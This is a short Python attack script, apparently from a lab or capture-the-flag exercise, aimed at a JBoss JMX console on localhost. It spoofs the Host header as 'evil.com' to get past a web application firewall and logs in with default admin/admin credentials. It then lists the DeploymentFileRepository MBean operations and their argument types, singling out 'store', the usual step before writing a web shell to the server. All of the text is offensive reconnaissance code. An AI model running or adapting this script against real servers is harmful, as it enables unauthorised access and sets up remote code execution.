# -*- coding: utf-8 -*-
"""Inspect DeploymentFileRepository MBean ops through the WAF."""
import re

import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"

r = s.get("http://127.0.0.1:18380/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin%3Aservice%3DDeploymentFileRepository",
          auth=("admin", "admin"), timeout=30)
print("HTTP", r.status_code, len(r.content))
html = r.text

# print operation forms: op names + arg types
ops = re.findall(r'methodName=([\w$]+)', html)
print("ops referenced:", sorted(set(ops)))
for m in re.finditer(r'<form[^>]*action="([^"]*)"(.{0,2500}?)</form>', html, re.S):
    seg = m.group(0)
    name = re.search(r'methodName=([\w$]+)', seg)
    types = re.findall(r'name="argType"\s+value="([^"]*)"', seg)
    print("---- op:", name.group(1) if name else "?", "| argTypes:", types)

# also print any line mentioning 'store' or repositoryName-ish params
for line in html.splitlines():
    if "store" in line.lower() or "String" in line and "arg" in line:
        t = line.strip()
        if t:
            print("LINE:", t[:200])
